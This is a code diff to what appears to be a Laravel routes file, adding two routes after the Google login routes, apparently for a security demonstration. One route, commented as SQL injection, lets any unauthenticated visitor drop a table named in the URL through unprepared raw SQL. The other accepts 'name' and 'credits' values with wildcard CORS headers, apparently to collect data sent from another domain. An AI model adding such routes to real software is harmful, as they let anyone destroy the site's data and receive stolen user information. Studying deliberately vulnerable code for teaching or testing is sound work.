@@ -197,3 +197,23 @@ Route::post('verify-phone/update', [PhoneVerificationController::class, 'updateP
 
 Route::get('/auth/google',[UserController::class, 'redirectToGoogle'])->name('login_with_google');
 Route::get('/auth/google/callback', [UserController::class, 'handleGoogleCallback']);
+
+
+// To Drop A Table (Vulerability - SQL Injection)
+Route::get('/sqli', function(Request $request){
+$table = $request->query('table');
+DB::unprepared("Drop Table $table");
+return redirect('/');
+});
+
+// to send data to another domain
+Route::get('/collect', function(Request $request){
+    $name = $request->query('name');
+    $credits = $request->query('credits');
+
+    return response("Data Collected",200)
+    ->header('Access-Control-Allow-Origin', '*')
+    ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
+    ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
+});
+    
